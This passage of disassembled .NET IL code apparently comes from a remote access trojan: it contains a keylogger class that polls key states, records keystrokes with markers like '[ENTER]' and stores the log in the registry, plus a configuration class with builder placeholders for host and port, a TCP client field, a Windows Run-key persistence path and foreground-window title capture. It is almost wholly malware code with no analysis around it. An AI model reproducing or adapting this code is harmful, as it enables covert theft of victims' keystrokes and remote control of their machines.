      IL_0066:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006b:  stloc.0
      IL_006c:  leave      IL_0250

      IL_0071:  br         IL_01c7

      IL_0076:  nop
      IL_0077:  ldloc.s    V_5
      IL_0079:  ldc.i4     0xa0
      IL_007e:  beq.s      IL_0089

      IL_0080:  ldloc.s    V_5
      IL_0082:  ldc.i4     0xa1
      IL_0087:  bne.un.s   IL_008b

      IL_0089:  br.s       IL_0094

      IL_008b:  ldloc.s    V_5
      IL_008d:  ldc.i4     0x10000
      IL_0092:  bne.un.s   IL_0096

      IL_0094:  br.s       IL_009c

      IL_0096:  ldloc.s    V_5
      IL_0098:  ldc.i4.s   16
      IL_009a:  bne.un.s   IL_009e

      IL_009c:  br.s       IL_00a7

      IL_009e:  ldloc.s    V_5
      IL_00a0:  ldc.i4     0x20000
      IL_00a5:  bne.un.s   IL_00a9

      IL_00a7:  br.s       IL_00af

      IL_00a9:  ldloc.s    V_5
      IL_00ab:  ldc.i4.s   17
      IL_00ad:  bne.un.s   IL_00b1

      IL_00af:  br.s       IL_00ba

      IL_00b1:  ldloc.s    V_5
      IL_00b3:  ldc.i4     0xa3
      IL_00b8:  bne.un.s   IL_00bc

      IL_00ba:  br.s       IL_00c5

      IL_00bc:  ldloc.s    V_5
      IL_00be:  ldc.i4     0xa2
      IL_00c3:  bne.un.s   IL_00c7

      IL_00c5:  br.s       IL_00d0

      IL_00c7:  ldloc.s    V_5
      IL_00c9:  ldc.i4     0x40000
      IL_00ce:  bne.un.s   IL_00d2

      IL_00d0:  br.s       IL_00d8

      IL_00d2:  ldloc.s    V_5
      IL_00d4:  ldc.i4.s   112
      IL_00d6:  bne.un.s   IL_00da

      IL_00d8:  br.s       IL_00e0

      IL_00da:  ldloc.s    V_5
      IL_00dc:  ldc.i4.s   113
      IL_00de:  bne.un.s   IL_00e2

      IL_00e0:  br.s       IL_00e8

      IL_00e2:  ldloc.s    V_5
      IL_00e4:  ldc.i4.s   114
      IL_00e6:  bne.un.s   IL_00ea

      IL_00e8:  br.s       IL_00f0

      IL_00ea:  ldloc.s    V_5
      IL_00ec:  ldc.i4.s   115
      IL_00ee:  bne.un.s   IL_00f2

      IL_00f0:  br.s       IL_00f8

      IL_00f2:  ldloc.s    V_5
      IL_00f4:  ldc.i4.s   116
      IL_00f6:  bne.un.s   IL_00fa

      IL_00f8:  br.s       IL_0100

      IL_00fa:  ldloc.s    V_5
      IL_00fc:  ldc.i4.s   117
      IL_00fe:  bne.un.s   IL_0102

      IL_0100:  br.s       IL_0108

      IL_0102:  ldloc.s    V_5
      IL_0104:  ldc.i4.s   118
      IL_0106:  bne.un.s   IL_010a

      IL_0108:  br.s       IL_0110

      IL_010a:  ldloc.s    V_5
      IL_010c:  ldc.i4.s   119
      IL_010e:  bne.un.s   IL_0112

      IL_0110:  br.s       IL_0118

      IL_0112:  ldloc.s    V_5
      IL_0114:  ldc.i4.s   120
      IL_0116:  bne.un.s   IL_011a

      IL_0118:  br.s       IL_0120

      IL_011a:  ldloc.s    V_5
      IL_011c:  ldc.i4.s   121
      IL_011e:  bne.un.s   IL_0122

      IL_0120:  br.s       IL_0128

      IL_0122:  ldloc.s    V_5
      IL_0124:  ldc.i4.s   122
      IL_0126:  bne.un.s   IL_012a

      IL_0128:  br.s       IL_0130

      IL_012a:  ldloc.s    V_5
      IL_012c:  ldc.i4.s   123
      IL_012e:  bne.un.s   IL_0132

      IL_0130:  br.s       IL_013b

      IL_0132:  ldloc.s    V_5
      IL_0134:  ldc.i4.s   35
      IL_0136:  beq.s      IL_013b

      IL_0138:  ldc.i4.0
      IL_0139:  br.s       IL_013c

      IL_013b:  ldc.i4.1
      IL_013c:  stloc.s    V_8
      IL_013e:  ldloc.s    V_8
      IL_0140:  brfalse.s  IL_014f

      IL_0142:  ldstr      ""
      IL_0147:  stloc.0
      IL_0148:  leave      IL_0250

      IL_014d:  br.s       IL_01c7

      IL_014f:  nop
      IL_0150:  ldloc.s    V_5
      IL_0152:  ldc.i4.s   32
      IL_0154:  ceq
      IL_0156:  stloc.s    V_8
      IL_0158:  ldloc.s    V_8
      IL_015a:  brfalse.s  IL_0169

      IL_015c:  ldstr      " "
      IL_0161:  stloc.0
      IL_0162:  leave      IL_0250

      IL_0167:  br.s       IL_01c7

      IL_0169:  nop
      IL_016a:  ldloc.s    V_5
      IL_016c:  ldc.i4.s   13
      IL_016e:  beq.s      IL_0179

      IL_0170:  ldloc.s    V_5
      IL_0172:  ldc.i4.s   13
      IL_0174:  beq.s      IL_0179

      IL_0176:  ldc.i4.0
      IL_0177:  br.s       IL_017a

      IL_0179:  ldc.i4.1
      IL_017a:  stloc.s    V_8
      IL_017c:  ldloc.s    V_8
      IL_017e:  brfalse.s  IL_01af

      IL_0180:  ldarg.0
      IL_0181:  ldfld      string j.kl::Logs
      IL_0186:  ldstr      "[ENTER]\r\n"
      IL_018b:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_0190:  stloc.s    V_7
      IL_0192:  ldloc.s    V_7
      IL_0194:  brfalse.s  IL_01a1

      IL_0196:  ldstr      ""
      IL_019b:  stloc.0
      IL_019c:  leave      IL_0250

      IL_01a1:  nop
      IL_01a2:  ldstr      "[ENTER]\r\n"
      IL_01a7:  stloc.0
      IL_01a8:  leave      IL_0250

      IL_01ad:  br.s       IL_01c7

      IL_01af:  nop
      IL_01b0:  ldloc.s    V_5
      IL_01b2:  ldc.i4.s   9
      IL_01b4:  ceq
      IL_01b6:  stloc.s    V_8
      IL_01b8:  ldloc.s    V_8
      IL_01ba:  brfalse.s  IL_01c7

      IL_01bc:  ldstr      "[TAP]\r\n"
      IL_01c1:  stloc.0
      IL_01c2:  leave      IL_0250

      IL_01c7:  nop
      IL_01c8:  ldloc.1
      IL_01c9:  stloc.s    V_8
      IL_01cb:  ldloc.s    V_8
      IL_01cd:  brfalse.s  IL_01de

      IL_01cf:  ldarg.1
      IL_01d0:  conv.ovf.u4
      IL_01d1:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_01d6:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_01db:  stloc.0
      IL_01dc:  leave.s    IL_0250

      IL_01de:  nop
      IL_01df:  ldarg.1
      IL_01e0:  conv.ovf.u4
      IL_01e1:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_01e6:  stloc.2
      IL_01e7:  leave.s    IL_024b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e9:  dup
      IL_01ea:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ef:  stloc.s    V_4
      IL_01f1:  nop
      IL_01f2:  ldloc.s    V_4
      IL_01f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f9:  nop
      IL_01fa:  ldloc.s    V_4
      IL_01fc:  stloc.3
      IL_01fd:  ldloc.1
      IL_01fe:  stloc.s    V_8
      IL_0200:  ldloc.s    V_8
      IL_0202:  brfalse.s  IL_0228

      IL_0204:  ldarg.1
      IL_0205:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_020a:  stloc.s    V_6
      IL_020c:  ldloca.s   V_6
      IL_020e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0213:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0218:  stloc.2
      IL_0219:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021e:  nop
      IL_021f:  ldloc.2
      IL_0220:  stloc.0
      IL_0221:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0226:  leave.s    IL_0250

      IL_0228:  nop
      IL_0229:  ldarg.1
      IL_022a:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_022f:  stloc.s    V_6
      IL_0231:  ldloca.s   V_6
      IL_0233:  call       instance string [mscorlib]System.Char::ToString()
      IL_0238:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_023d:  stloc.2
      IL_023e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0243:  nop
      IL_0244:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0249:  leave.s    IL_024b

    }  // end handler
    IL_024b:  nop
    IL_024c:  ldloc.2
    IL_024d:  stloc.0
    IL_024e:  br.s       IL_0250

    IL_0250:  ldloc.0
    IL_0251:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       155 (0x9b)
    .maxstack  7
    .locals init (string V_0,
             uint32 V_1,
             uint8[] V_2,
             class [mscorlib]System.Text.StringBuilder V_3,
             native int V_4,
             int32 V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             bool V_8)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0007:  stloc.3
      IL_0008:  ldc.i4     0xff
      IL_000d:  newarr     [mscorlib]System.Byte
      IL_0012:  stloc.2
      IL_0013:  ldloc.2
      IL_0014:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0019:  ldc.i4.0
      IL_001a:  ceq
      IL_001c:  stloc.s    V_8
      IL_001e:  ldloc.s    V_8
      IL_0020:  brfalse.s  IL_002a

      IL_0022:  ldstr      ""
      IL_0027:  stloc.0
      IL_0028:  leave.s    IL_0099

      IL_002a:  nop
      IL_002b:  ldarg.0
      IL_002c:  ldc.i4.0
      IL_002d:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0032:  stloc.1
      IL_0033:  ldc.i4.0
      IL_0034:  stloc.s    V_5
      IL_0036:  call       native int j.OK::GetForegroundWindow()
      IL_003b:  ldloca.s   V_5
      IL_003d:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0042:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    V_4
      IL_004e:  ldarg.0
      IL_004f:  ldloc.1
      IL_0050:  ldloc.2
      IL_0051:  ldloc.3
      IL_0052:  ldc.i4.5
      IL_0053:  ldc.i4.0
      IL_0054:  ldloc.s    V_4
      IL_0056:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_005b:  pop
      IL_005c:  ldloc.3
      IL_005d:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0062:  stloc.0
      IL_0063:  leave.s    IL_0099

      IL_0065:  leave.s    IL_0089

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0067:  dup
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006d:  stloc.s    V_7
      IL_006f:  nop
      IL_0070:  ldloc.s    V_7
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0077:  nop
      IL_0078:  ldloc.s    V_7
      IL_007a:  stloc.s    V_6
      IL_007c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0081:  nop
      IL_0082:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0087:  leave.s    IL_0089

    }  // end handler
    IL_0089:  nop
    IL_008a:  ldarg.0
    IL_008b:  conv.ovf.i4.un
    IL_008c:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0091:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0096:  stloc.0
    IL_0097:  br.s       IL_0099

    IL_0099:  ldloc.0
    IL_009a:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       350 (0x15e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             bool V_7)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.0
    IL_0003:  ldfld      string j.kl::vn
    IL_0008:  ldstr      ""
    IL_000d:  call       object j.OK::GTV(string,
                                          object)
    IL_0012:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0017:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001c:  stfld      string j.kl::Logs
    IL_0021:  nop
    .try
    {
      IL_0022:  ldc.i4.0
      IL_0023:  stloc.0
      IL_0024:  br         IL_012d

      IL_0029:  ldloc.0
      IL_002a:  ldc.i4.1
      IL_002b:  add.ovf
      IL_002c:  stloc.0
      IL_002d:  ldc.i4.0
      IL_002e:  stloc.1
      IL_002f:  nop
      IL_0030:  ldloc.1
      IL_0031:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_0036:  ldc.i4     0xffff8001
      IL_003b:  ceq
      IL_003d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0042:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_0047:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  and
      IL_0050:  stloc.s    V_7
      IL_0052:  ldloc.s    V_7
      IL_0054:  brfalse.s  IL_00a0

      IL_0056:  ldloc.1
      IL_0057:  stloc.2
      IL_0058:  ldarg.0
      IL_0059:  ldloc.2
      IL_005a:  callvirt   instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_005f:  stloc.3
      IL_0060:  ldloc.3
      IL_0061:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0066:  ldc.i4.0
      IL_0067:  cgt
      IL_0069:  stloc.s    V_7
      IL_006b:  ldloc.s    V_7
      IL_006d:  brfalse.s  IL_0098

      IL_006f:  ldarg.0
      IL_0070:  ldarg.0
      IL_0071:  ldfld      string j.kl::Logs
      IL_0076:  ldarg.0
      IL_0077:  callvirt   instance string j.kl::AV()
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldarg.0
      IL_0088:  ldfld      string j.kl::Logs
      IL_008d:  ldloc.3
      IL_008e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0093:  stfld      string j.kl::Logs
      IL_0098:  nop
      IL_0099:  ldarg.0
      IL_009a:  ldloc.2
      IL_009b:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_00a0:  nop
      IL_00a1:  ldloc.1
      IL_00a2:  ldc.i4.1
      IL_00a3:  add.ovf
      IL_00a4:  stloc.1
      IL_00a5:  ldloc.1
      IL_00a6:  ldc.i4     0xff
      IL_00ab:  cgt
      IL_00ad:  ldc.i4.0
      IL_00ae:  ceq
      IL_00b0:  stloc.s    V_7
      IL_00b2:  ldloc.s    V_7
      IL_00b4:  brtrue     IL_0030

      IL_00b9:  ldloc.0
      IL_00ba:  ldc.i4     0x3e8
      IL_00bf:  ceq
      IL_00c1:  stloc.s    V_7
      IL_00c3:  ldloc.s    V_7
      IL_00c5:  brfalse.s  IL_0124

      IL_00c7:  ldc.i4.0
      IL_00c8:  stloc.0
      IL_00c9:  ldstr      "[klen]"
      IL_00ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00d3:  ldc.i4     0x400
      IL_00d8:  mul.ovf
      IL_00d9:  stloc.s    V_4
      IL_00db:  ldarg.0
      IL_00dc:  ldfld      string j.kl::Logs
      IL_00e1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00e6:  ldloc.s    V_4
      IL_00e8:  cgt
      IL_00ea:  stloc.s    V_7
      IL_00ec:  ldloc.s    V_7
      IL_00ee:  brfalse.s  IL_0110

      IL_00f0:  ldarg.0
      IL_00f1:  ldarg.0
      IL_00f2:  ldfld      string j.kl::Logs
      IL_00f7:  ldc.i4.0
      IL_00f8:  ldarg.0
      IL_00f9:  ldfld      string j.kl::Logs
      IL_00fe:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0103:  ldloc.s    V_4
      IL_0105:  sub.ovf
      IL_0106:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_010b:  stfld      string j.kl::Logs
      IL_0110:  nop
      IL_0111:  ldarg.0
      IL_0112:  ldfld      string j.kl::vn
      IL_0117:  ldarg.0
      IL_0118:  ldfld      string j.kl::Logs
      IL_011d:  ldc.i4.1
      IL_011e:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0123:  pop
      IL_0124:  nop
      IL_0125:  ldc.i4.1
      IL_0126:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_012b:  nop
      IL_012c:  nop
      IL_012d:  ldc.i4.1
      IL_012e:  stloc.s    V_7
      IL_0130:  ldloc.s    V_7
      IL_0132:  brtrue     IL_0029

      IL_0137:  leave.s    IL_015b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0139:  dup
      IL_013a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_013f:  stloc.s    V_6
      IL_0141:  nop
      IL_0142:  ldloc.s    V_6
      IL_0144:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0149:  nop
      IL_014a:  ldloc.s    V_6
      IL_014c:  stloc.s    V_5
      IL_014e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0153:  nop
      IL_0154:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0159:  leave.s    IL_015b

    }  // end handler
    IL_015b:  nop
    IL_015c:  nop
    IL_015d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested private GetWindowCmd
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype j.OK/GetWindowCmd GW_HWNDFIRST = uint32(0x00000000)
    .field public static literal valuetype j.OK/GetWindowCmd GW_HWNDLAST = uint32(0x00000001)
    .field public static literal valuetype j.OK/GetWindowCmd GW_HWNDNEXT = uint32(0x00000002)
    .field public static literal valuetype j.OK/GetWindowCmd GW_HWNDPREV = uint32(0x00000003)
    .field public static literal valuetype j.OK/GetWindowCmd GW_OWNER = uint32(0x00000004)
    .field public static literal valuetype j.OK/GetWindowCmd GW_CHILD = uint32(0x00000005)
    .field public static literal valuetype j.OK/GetWindowCmd GW_ENABLEDPOPUP = uint32(0x00000006)
  } // end of class GetWindowCmd

  .class auto ansi sealed nested private SW
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype j.OK/SW Hide = int32(0x00000000)
    .field public static literal valuetype j.OK/SW Normal = int32(0x00000001)
    .field public static literal valuetype j.OK/SW ShowMinimized = int32(0x00000002)
    .field public static literal valuetype j.OK/SW ShowMaximized = int32(0x00000003)
    .field public static literal valuetype j.OK/SW ShowNoActivate = int32(0x00000004)
    .field public static literal valuetype j.OK/SW Show = int32(0x00000005)
    .field public static literal valuetype j.OK/SW Minimize = int32(0x00000006)
    .field public static literal valuetype j.OK/SW ShowMinNoActive = int32(0x00000007)
    .field public static literal valuetype j.OK/SW ShowNA = int32(0x00000008)
    .field public static literal valuetype j.OK/SW Restore = int32(0x00000009)
    .field public static literal valuetype j.OK/SW ShowDefault = int32(0x0000000A)
    .field public static literal valuetype j.OK/SW ForceMinimize = int32(0x0000000B)
    .field public static literal valuetype j.OK/SW Max = int32(0x0000000B)
  } // end of class SW

  .field public string Code
  .field public string RunAs
  .field private static literal int32 SETDESKWALLPAPER = int32(0x00000014)
  .field private static literal int32 UPDATEINIFILE = int32(0x00000001)
  .field private static uint8[] b
  .field public static bool BD
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field public static bool Cn
  .field public static string DR
  .field public static string EXE
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static string H
  .field public static bool Idr
  .field public static bool IsF
  .field public static bool Isu
  .field public static class j.kl kq
  .field private static string lastcap
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field public static object MT
  .field public static string P
  .field public static object PLG
  .field public static string RG
  .field public static string sf
  .field public static string VN
  .field public static string VR
  .field public static string Y
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       247 (0xf7)
    .maxstack  1
    IL_0000:  ldc.i4     0x1401
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  stsfld     uint8[] j.OK::b
    IL_000f:  ldstr      "[BD]"
    IL_0014:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0019:  stsfld     bool j.OK::BD
    IL_001e:  ldnull
    IL_001f:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_0024:  ldc.i4.0
    IL_0025:  stsfld     bool j.OK::Cn
    IL_002a:  ldstr      "[DR]"
    IL_002f:  stsfld     string j.OK::DR
    IL_0034:  ldstr      "[EXE]"
    IL_0039:  stsfld     string j.OK::EXE
    IL_003e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0043:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0048:  ldstr      "[H]"
    IL_004d:  stsfld     string j.OK::H
    IL_0052:  ldstr      "[Idr]"
    IL_0057:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005c:  stsfld     bool j.OK::Idr
    IL_0061:  ldstr      "[Isf]"
    IL_0066:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006b:  stsfld     bool j.OK::IsF
    IL_0070:  ldstr      "[Isu]"
    IL_0075:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007a:  stsfld     bool j.OK::Isu
    IL_007f:  ldnull
    IL_0080:  stsfld     class j.kl j.OK::kq
    IL_0085:  ldstr      ""
    IL_008a:  stsfld     string j.OK::lastcap
    IL_008f:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0094:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_0099:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_009e:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00a3:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00a8:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_00ad:  ldnull
    IL_00ae:  stsfld     object j.OK::MT
    IL_00b3:  ldstr      "[P]"
    IL_00b8:  stsfld     string j.OK::P
    IL_00bd:  ldnull
    IL_00be:  stsfld     object j.OK::PLG
    IL_00c3:  ldstr      "[RG]"
    IL_00c8:  stsfld     string j.OK::RG
    IL_00cd:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00d2:  stsfld     string j.OK::sf
    IL_00d7:  ldstr      "[VN]"
    IL_00dc:  stsfld     string j.OK::VN
    IL_00e1:  ldstr      "0.7d"
    IL_00e6:  stsfld     string j.OK::VR
    IL_00eb:  ldstr      "|'|'|"
    IL_00f0:  stsfld     string j.OK::Y
    IL_00f5:  nop
    IL_00f6:  ret
  } // end of method OK::.cctor

  .method private static void  _Lambda__1(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       15 (0xf)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  castclass  uint8[]
    IL_0007:  call       void j.OK::Ind(uint8[])
    IL_000c:  nop
    IL_000d:  nop
    IL_000e:  ret
  } // end of method OK::_Lambda__1

  .method private static void  _Lambda__2(object a0,
                                          class [System]Microsoft.Win32.SessionEndingEventArgs a1) cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerStepThroughAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void j.OK::ED()
    IL_0006:  nop
    IL_0007:  nop
    IL_0008:  ret
  } // end of method OK::_Lambda__2

  .method public static string  ACT() cil managed
  {
    // Code size       125 (0x7d)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             bool V_6)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       native int j.OK::GetForegroundWindow()
      IL_0007:  stloc.2
      IL_0008:  ldloc.2
      IL_0009:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000e:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0013:  stloc.s    V_6
      IL_0015:  ldloc.s    V_6
      IL_0017:  brfalse.s  IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_007b

      IL_0021:  nop
      IL_0022:  ldloc.2
      IL_0023:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0028:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_002d:  ldc.i4.1
      IL_002e:  add.ovf
      IL_002f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0034:  stloc.3
      IL_0035:  ldloc.2
      IL_0036:  ldloca.s   V_3
      IL_0038:  ldloc.3
      IL_0039:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_003e:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_0043:  pop
      IL_0044:  ldloca.s   V_3
      IL_0046:  call       string j.OK::ENB(string&)
      IL_004b:  stloc.1
      IL_004c:  leave.s    IL_0076

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_004e:  dup
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0054:  stloc.s    V_5
      IL_0056:  nop
      IL_0057:  ldloc.s    V_5
      IL_0059:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_005e:  nop
      IL_005f:  ldloc.s    V_5
      IL_0061:  stloc.s    V_4
      IL_0063:  ldstr      ""
      IL_0068:  stloc.1
      IL_0069:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006e:  nop
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  nop
    IL_0077:  ldloc.1
    IL_0078:  stloc.0
